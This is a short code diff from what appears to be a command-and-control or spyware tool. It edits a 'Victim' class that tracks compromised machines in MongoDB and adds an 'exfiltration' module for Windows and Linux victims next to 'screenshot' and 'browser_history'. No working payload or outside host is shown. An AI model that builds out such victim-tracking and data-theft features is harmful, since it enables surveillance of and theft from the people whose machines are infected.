@@ -13,7 +13,7 @@ class Victim:
 
 	mongoclient = None
 	victims = {}
-	module_hash = {'Windows' : ['screenshot','browser_history'], 'Linux': ['screenshot']}
+	module_hash = {'Windows' : ['screenshot','browser_history','exfiltration'], 'Linux': ['screenshot','exfiltration']}
 
 	def __init__(self,victim_id,platform,os_version,admin,status = 'Alive',lastseen = datetime.datetime.now(),add_db = True):
 		self.victim_id = victim_id
